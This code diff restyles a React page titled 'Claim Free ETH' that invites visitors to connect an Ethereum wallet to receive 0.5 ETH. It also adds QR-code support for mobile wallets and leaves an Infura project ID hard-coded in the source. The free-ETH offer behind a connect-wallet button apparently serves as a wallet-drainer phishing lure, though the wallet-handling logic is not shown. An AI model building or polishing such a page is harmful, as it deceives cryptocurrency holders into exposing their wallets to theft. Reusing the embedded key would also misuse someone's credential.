@@ -14,9 +14,10 @@ const App = () => {
   useEffect(() => {
     const provider = new EthereumProvider({
       rpc: {
-        1: "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2", // Your Infura project ID
+        1: "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2", // Your Inf/ura project ID
       },
       chainId: 1, // Ethereum mainnet
+      qrcode: true, // Enable QR code for mobile
     });
 
     setWalletProvider(provider);
@@ -77,37 +78,67 @@ const App = () => {
   };
 
   return (
-    <div style={{ padding: "20px", fontFamily: "Arial, sans-serif" }}>
-      <h1 style={{ textAlign: "center" }}>Claim Free ETH</h1>
-      <p style={{ textAlign: "center" }}>
-        Connect your wallet to claim 0.5 ETH now. It's free and easy!
-      </p>
-      <button
-        onClick={connectWallet}
-        disabled={loading}
+    <div
+      style={{
+        display: "flex",
+        justifyContent: "center",
+        alignItems: "center",
+        height: "100vh",
+        backgroundColor: "#f5f5f5",
+        fontFamily: "Arial, sans-serif",
+        padding: "20px",
+      }}
+    >
+      <div
         style={{
-          margin: "20px auto",
-          display: "block",
-          padding: "12px 24px",
-          fontSize: "16px",
-          backgroundColor: "#4CAF50",
-          color: "white",
-          border: "none",
-          borderRadius: "5px",
-          cursor: "pointer",
+          backgroundColor: "#ffffff",
+          borderRadius: "10px",
+          padding: "30px",
+          boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
+          maxWidth: "400px",
+          width: "100%",
         }}
       >
-        {loading ? "Connecting..." : "Connect Wallet"}
-      </button>
+        <h1 style={{ textAlign: "center" }}>Claim Free ETH</h1>
+        <p style={{ textAlign: "center", marginBottom: "20px" }}>
+          Connect your wallet to claim 0.5 ETH now. It's free and easy!
+        </p>
+        <button
+          onClick={connectWallet}
+          disabled={loading}
+          style={{
+            margin: "20px auto",
+            display: "block",
+            padding: "12px 24px",
+            fontSize: "16px",
+            backgroundColor: "#4CAF50",
+            color: "white",
+            border: "none",
+            borderRadius: "5px",
+            cursor: "pointer",
+            transition: "background-color 0.3s ease",
+          }}
+        >
+          {loading ? "Connecting..." : "Connect Wallet"}
+        </button>
 
-      {response && (
-        <div style={{ marginTop: "20px", padding: "15px", backgroundColor: "#f0f0f0", borderRadius: "5px" }}>
-          <h3 style={{ marginBottom: "10px" }}>Response:</h3>
-          <pre style={{ whiteSpace: "pre-wrap", overflowX: "auto" }}>
-            {JSON.stringify(response, null, 2)}
-          </pre>
-        </div>
-      )}
+        {response && (
+          <div
+            style={{
+              marginTop: "20px",
+              padding: "15px",
+              backgroundColor: "#f0f0f0",
+              borderRadius: "5px",
+              border: "1px solid #ccc",
+            }}
+          >
+            <h3 style={{ marginBottom: "10px" }}>Response:</h3>
+            <pre style={{ whiteSpace: "pre-wrap", overflowX: "auto" }}>
+              {JSON.stringify(response, null, 2)}
+            </pre>
+          </div>
+        )}
+      </div>
     </div>
   );
 };
